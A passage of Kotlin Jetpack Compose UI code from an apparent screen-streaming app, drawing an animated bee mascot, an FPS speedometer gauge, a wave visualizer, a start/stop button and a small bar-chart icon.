                            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                            isBatteryOptIgnored = pm.isIgnoringBatteryOptimizations(context.packageName)
                        } catch (e: Exception) {
                            Toast.makeText(context, "Cannot open battery settings directly", Toast.LENGTH_SHORT).show()
                        }
                    } else {
                        startStreaming()
                    }
                }
            },
            modifier = Modifier.fillMaxWidth()
        )

        Spacer(modifier = Modifier.height(16.dp))
    }
}

/**
 * Animated Bee Mascot drawn on Canvas with wing flap and floating animation
 */
@Composable
fun BeeMascot(modifier: Modifier = Modifier) {
    val infiniteTransition = rememberInfiniteTransition(label = "beeAnim")
    val bobbingOffset by infiniteTransition.animateFloat(
        initialValue = -3f,
        targetValue = 3f,
        animationSpec = infiniteRepeatable(
            animation = tween(1200, easing = FastOutSlowInEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "bobbing"
    )

    Canvas(
        modifier = modifier
            .drawBehind {
                // Bobbing is handled by translation inside draw scope
            }
    ) {
        val w = size.width
        val h = size.height
        val offsetY = bobbingOffset * density

        // Left Wing
        drawOval(
            color = Color(0xD9E0F2FE),
            topLeft = Offset(w * 0.08f, h * 0.12f + offsetY),
            size = Size(w * 0.42f, h * 0.32f)
        )
        // Right Wing
        drawOval(
            color = Color(0xD9E0F2FE),
            topLeft = Offset(w * 0.46f, h * 0.14f + offsetY),
            size = Size(w * 0.42f, h * 0.32f)
        )

        // Antennas
        drawLine(
            color = Color(0xFF1E293B),
            start = Offset(w * 0.38f, h * 0.30f + offsetY),
            end = Offset(w * 0.30f, h * 0.10f + offsetY),
            strokeWidth = 3f * density,
            cap = StrokeCap.Round
        )
        drawCircle(
            color = Color(0xFF1E293B),
            radius = 3.5f * density,
            center = Offset(w * 0.30f, h * 0.10f + offsetY)
        )

        drawLine(
            color = Color(0xFF1E293B),
            start = Offset(w * 0.54f, h * 0.30f + offsetY),
            end = Offset(w * 0.62f, h * 0.10f + offsetY),
            strokeWidth = 3f * density,
            cap = StrokeCap.Round
        )
        drawCircle(
            color = Color(0xFF1E293B),
            radius = 3.5f * density,
            center = Offset(w * 0.62f, h * 0.10f + offsetY)
        )

        // Yellow Bee Body
        drawOval(
            color = Color(0xFFFBBF24),
            topLeft = Offset(w * 0.15f, h * 0.26f + offsetY),
            size = Size(w * 0.68f, h * 0.62f)
        )

        // Black Stripes on Body
        drawArc(
            color = Color(0xFF1E293B),
            startAngle = 15f,
            sweepAngle = 150f,
            useCenter = false,
            topLeft = Offset(w * 0.22f, h * 0.48f + offsetY),
            size = Size(w * 0.54f, h * 0.22f),
            style = Stroke(width = 4.5f * density, cap = StrokeCap.Round)
        )
        drawArc(
            color = Color(0xFF1E293B),
            startAngle = 20f,
            sweepAngle = 140f,
            useCenter = false,
            topLeft = Offset(w * 0.26f, h * 0.62f + offsetY),
            size = Size(w * 0.46f, h * 0.20f),
            style = Stroke(width = 4f * density, cap = StrokeCap.Round)
        )

        // Eyes
        drawCircle(
            color = Color(0xFF0F172A),
            radius = 3.5f * density,
            center = Offset(w * 0.37f, h * 0.42f + offsetY)
        )
        drawCircle(
            color = Color.White,
            radius = 1.2f * density,
            center = Offset(w * 0.36f, h * 0.40f + offsetY)
        )

        drawCircle(
            color = Color(0xFF0F172A),
            radius = 3.5f * density,
            center = Offset(w * 0.55f, h * 0.42f + offsetY)
        )
        drawCircle(
            color = Color.White,
            radius = 1.2f * density,
            center = Offset(w * 0.54f, h * 0.40f + offsetY)
        )

        // Rosy Cheeks
        drawCircle(
            color = Color(0xFFF472B6).copy(alpha = 0.5f),
            radius = 3.2f * density,
            center = Offset(w * 0.28f, h * 0.48f + offsetY)
        )
        drawCircle(
            color = Color(0xFFF472B6).copy(alpha = 0.5f),
            radius = 3.2f * density,
            center = Offset(w * 0.64f, h * 0.48f + offsetY)
        )

        // Cute Smile
        drawArc(
            color = Color(0xFF1E293B),
            startAngle = 20f,
            sweepAngle = 140f,
            useCenter = false,
            topLeft = Offset(w * 0.41f, h * 0.46f + offsetY),
            size = Size(w * 0.12f, h * 0.08f),
            style = Stroke(width = 2.2f * density, cap = StrokeCap.Round)
        )
    }
}

/**
 * Pulsing Dot for Live Status
 */
@Composable
fun PulsingDot(
    isActive: Boolean,
    activeColor: Color,
    inactiveColor: Color,
    modifier: Modifier = Modifier
) {
    val infiniteTransition = rememberInfiniteTransition(label = "pulseDot")
    val alpha by infiniteTransition.animateFloat(
        initialValue = 0.4f,
        targetValue = 1f,
        animationSpec = infiniteRepeatable(
            animation = tween(900, easing = FastOutSlowInEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "dotAlpha"
    )

    Box(
        modifier = modifier
            .size(12.dp)
            .drawBehind {
                if (isActive) {
                    drawCircle(
                        color = activeColor.copy(alpha = alpha * 0.35f),
                        radius = size.minDimension / 2f
                    )
                    drawCircle(
                        color = activeColor,
                        radius = (size.minDimension / 2f) - 2f,
                        style = Stroke(width = 2f)
                    )
                } else {
                    drawCircle(
                        color = inactiveColor,
                        radius = (size.minDimension / 2f) - 2f,
                        style = Stroke(width = 2f)
                    )
                }
            }
    )
}

/**
 * Animated Speedometer Arc for Live FPS Monitor
 */
@Composable
fun FpsSpeedometerGauge(
    currentFps: Int,
    targetFps: Int = 15,
    modifier: Modifier = Modifier
) {
    val animatedFps by animateFloatAsState(
        targetValue = currentFps.toFloat(),
        animationSpec = tween(durationMillis = 400, easing = FastOutSlowInEasing),
        label = "fpsAnim"
    )

    Box(
        modifier = modifier,
        contentAlignment = Alignment.Center
    ) {
        Canvas(modifier = Modifier.fillMaxSize()) {
            val w = size.width
            val h = size.height
            val center = Offset(w / 2f, h * 0.58f)
            val radius = minOf(w * 0.44f, h * 0.60f)

            val startAngle = 145f
            val totalSweep = 250f
            val progress = (animatedFps / targetFps.coerceAtLeast(1)).coerceIn(0.05f, 1.2f)
            val activeSweep = (totalSweep * (progress / 1.2f)).coerceIn(8f, totalSweep)

            // Radial yellow tick marks
            val tickCount = 18
            for (i in 0..tickCount) {
                val angleDeg = startAngle + (totalSweep / tickCount) * i
                val angleRad = Math.toRadians(angleDeg.toDouble())
                val outerR = radius + 14f
                val innerR = radius + 4f
                val startX = (center.x + innerR * cos(angleRad)).toFloat()
                val startY = (center.y + innerR * sin(angleRad)).toFloat()
                val endX = (center.x + outerR * cos(angleRad)).toFloat()
                val endY = (center.y + outerR * sin(angleRad)).toFloat()

                drawLine(
                    color = Color(0xFFF59E0B).copy(alpha = 0.85f),
                    start = Offset(startX, startY),
                    end = Offset(endX, endY),
                    strokeWidth = 2.5f * density,
                    cap = StrokeCap.Round
                )
            }

            // Dark background track
            drawArc(
                color = Color(0xFF1A2638),
                startAngle = startAngle,
                sweepAngle = totalSweep,
                useCenter = false,
                topLeft = Offset(center.x - radius, center.y - radius),
                size = Size(radius * 2, radius * 2),
                style = Stroke(width = 16f * density, cap = StrokeCap.Round)
            )

            // Active glowing gradient arc
            val gradientBrush = Brush.sweepGradient(
                colors = listOf(
                    Color(0xFF38BDF8),
                    Color(0xFF10B981),
                    Color(0xFFFACC15),
                    Color(0xFFF59E0B),
                    Color(0xFF38BDF8)
                ),
                center = center
            )

            drawArc(
                brush = gradientBrush,
                startAngle = startAngle,
                sweepAngle = activeSweep,
                useCenter = false,
                topLeft = Offset(center.x - radius, center.y - radius),
                size = Size(radius * 2, radius * 2),
                style = Stroke(width = 16f * density, cap = StrokeCap.Round)
            )

            // Knob indicator at the end of active arc
            val headAngleDeg = startAngle + activeSweep
            val headAngleRad = Math.toRadians(headAngleDeg.toDouble())
            val headX = (center.x + radius * cos(headAngleRad)).toFloat()
            val headY = (center.y + radius * sin(headAngleRad)).toFloat()

            // Glow outer halo
            drawCircle(
                color = Color(0xFFFACC15).copy(alpha = 0.3f),
                radius = 12f * density,
                center = Offset(headX, headY)
            )
            // Yellow knob
            drawCircle(
                color = Color(0xFFFACC15),
                radius = 7.5f * density,
                center = Offset(headX, headY)
            )
            // White core
            drawCircle(
                color = Color.White,
                radius = 4f * density,
                center = Offset(headX, headY)
            )
        }

        // Center Content (FPS value and TURBO BOOSTED badge)
        Column(
            horizontalAlignment = Alignment.CenterHorizontally,
            modifier = Modifier.padding(top = 22.dp)
        ) {
            Row(
                verticalAlignment = Alignment.Bottom,
                horizontalArrangement = Arrangement.Center
            ) {
                Text(
                    text = "${animatedFps.toInt()}",
                    fontSize = 44.sp,
                    fontWeight = FontWeight.Black,
                    color = Color(0xFFFACC15)
                )
                Spacer(modifier = Modifier.width(4.dp))
                Text(
                    text = "FPS",
                    fontSize = 17.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color(0xFF38BDF8),
                    modifier = Modifier.padding(bottom = 6.dp)
                )
            }

            Spacer(modifier = Modifier.height(4.dp))

            Box(
                modifier = Modifier
                    .clip(RoundedCornerShape(12.dp))
                    .background(Color(0xFF0F3235))
                    .padding(horizontal = 12.dp, vertical = 4.dp)
            ) {
                Text(
                    text = "TURBO BOOSTED",
                    fontSize = 11.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color(0xFF2DD4BF),
                    letterSpacing = 0.5.sp
                )
            }
        }
    }
}

/**
 * Animated Tunnel Wave Graphic with dual undulating lines
 */
@Composable
fun TunnelWaveVisualizer(
    isActive: Boolean,
    modifier: Modifier = Modifier
) {
    val infiniteTransition = rememberInfiniteTransition(label = "waveTransition")
    val phase by infiniteTransition.animateFloat(
        initialValue = 0f,
        targetValue = (2 * Math.PI).toFloat(),
        animationSpec = infiniteRepeatable(
            animation = tween(durationMillis = if (isActive) 1800 else 4500, easing = LinearEasing),
            repeatMode = RepeatMode.Restart
        ),
        label = "wavePhase"
    )

    Box(
        modifier = modifier
            .clip(RoundedCornerShape(14.dp))
            .background(Color(0xFF080F1D))
    ) {
        Canvas(modifier = Modifier.fillMaxSize()) {
            val w = size.width
            val h = size.height
            val midY = h * 0.52f

            val yellowPath = Path()
            val cyanPath = Path()

            val step = 4f
            var first = true

            var x = 0f
            while (x <= w + step) {
                val normX = x / w
                val amp = if (isActive) h * 0.34f else h * 0.16f

                val yYellow = midY +
                    sin(normX * 3.4 * Math.PI + phase).toFloat() * amp * 0.72f +
                    cos(normX * 1.8 * Math.PI + phase * 0.6f).toFloat() * amp * 0.36f

                val yCyan = midY +
                    sin(normX * 3.2 * Math.PI + phase + Math.PI * 0.45).toFloat() * amp * 0.68f +
                    cos(normX * 2.2 * Math.PI + phase * 0.8f).toFloat() * amp * 0.32f

                if (first) {
                    yellowPath.moveTo(x, yYellow)
                    cyanPath.moveTo(x, yCyan)
                    first = false
                } else {
                    yellowPath.lineTo(x, yYellow)
                    cyanPath.lineTo(x, yCyan)
                }
                x += step
            }

            // Draw cyan wave behind
            drawPath(
                path = cyanPath,
                color = Color(0xFF38BDF8),
                style = Stroke(width = 3.5f * density, cap = StrokeCap.Round, join = StrokeJoin.Round)
            )

            // Draw yellow wave in front
            drawPath(
                path = yellowPath,
                color = Color(0xFFFACC15),
                style = Stroke(width = 3.5f * density, cap = StrokeCap.Round, join = StrokeJoin.Round)
            )
        }
    }
}

/**
 * Animated Action Button with multi-color marching dashed border
 */
@Composable
fun AnimatedTurboButton(
    isServiceActive: Boolean,
    onClick: () -> Unit,
    modifier: Modifier = Modifier
) {
    val infiniteTransition = rememberInfiniteTransition(label = "dashTransition")
    val dashPhase by infiniteTransition.animateFloat(
        initialValue = 0f,
        targetValue = 120f,
        animationSpec = infiniteRepeatable(
            animation = tween(durationMillis = 1800, easing = LinearEasing),
            repeatMode = RepeatMode.Restart
        ),
        label = "dashPhase"
    )

    Box(
        modifier = modifier
            .drawBehind {
                val strokeWidth = 2.5f * density
                val dashLength = 14f * density
                val gapLength = 9f * density
                val cornerRadius = 18f * density

                val pathEffect = PathEffect.dashPathEffect(
                    floatArrayOf(dashLength, gapLength),
                    dashPhase
                )

                val gradientBrush = Brush.sweepGradient(
                    colors = listOf(
                        Color(0xFF38BDF8), // Blue
                        Color(0xFFFACC15), // Yellow
                        Color(0xFFEF4444), // Red
                        Color(0xFF38BDF8)  // Blue
                    ),
                    center = center
                )

                drawRoundRect(
                    brush = gradientBrush,
                    topLeft = Offset(strokeWidth / 2f, strokeWidth / 2f),
                    size = Size(size.width - strokeWidth, size.height - strokeWidth),
                    cornerRadius = CornerRadius(cornerRadius, cornerRadius),
                    style = Stroke(width = strokeWidth, pathEffect = pathEffect)
                )
            }
            .padding(4.dp)
            .clip(RoundedCornerShape(16.dp))
            .background(
                if (isServiceActive) {
                    Brush.horizontalGradient(
                        listOf(
                            Color(0xFFDC2626),
                            Color(0xFFEF4444),
                            Color(0xFFDC2626)
                        )
                    )
                } else {
                    Brush.horizontalGradient(
                        listOf(
                            Color(0xFF1D4ED8),
                            Color(0xFF2563EB),
                            Color(0xFF3B82F6)
                        )
                    )
                }
            )
            .clickable { onClick() }
            .padding(horizontal = 16.dp, vertical = 14.dp)
    ) {
        Row(
            verticalAlignment = Alignment.CenterVertically,
            modifier = Modifier.fillMaxWidth()
        ) {
            // Circle with Lightning Bolt
            Box(
                modifier = Modifier
                    .size(46.dp)
                    .clip(CircleShape)
                    .background(
                        if (isServiceActive) Color(0xFF991B1B) else Color(0xFF1E3A8A)
                    ),
                contentAlignment = Alignment.Center
            ) {
                Text(
                    text = "⚡",
                    fontSize = 22.sp,
                    color = Color(0xFFFACC15)
                )
            }

            Spacer(modifier = Modifier.width(14.dp))

            Column {
                Text(
                    text = if (isServiceActive) "SCREEN Analyser AI ACTIVE" else "START",
                    fontSize = 17.sp,
                    fontWeight = FontWeight.ExtraBold,
                    color = Color.White
                )
                Spacer(modifier = Modifier.height(2.dp))
                Text(
                    text = if (isServiceActive) {
                        "HARDWARE 15 FPS TUNNEL RUNNING • TAP TO STOP"
                    } else {
                        "HARDWARE 15 FPS TUNNEL READY • TAP TO CONNECT"
                    },
                    fontSize = 10.5.sp,
                    fontWeight = FontWeight.Bold,
                    color = if (isServiceActive) Color(0xFFFEF08A) else Color(0xFF93C5FD)
                )
            }
        }
    }
}

/**
 * Small custom bar chart icon for Live Data Counter header
 */
@Composable
fun CustomBarChartIcon(modifier: Modifier = Modifier) {
    Canvas(modifier = modifier) {
        val w = size.width
        val h = size.height

        // Bar 1 (Cyan)
        drawRect(
            color = Color(0xFF38BDF8),
            topLeft = Offset(0f, h * 0.45f),
            size = Size(w * 0.24f, h * 0.55f)
        )
        // Bar 2 (Yellow)
        drawRect(
            color = Color(0xFFFACC15),
            topLeft = Offset(w * 0.36f, 0f),
            size = Size(w * 0.24f, h)
        )
        // Bar 3 (Pink / Red)
        drawRect(
            color = Color(0xFFF87171),
            topLeft = Offset(w * 0.72f, h * 0.25f),
            size = Size(w * 0.24f, h * 0.75f)
        )
    }
}
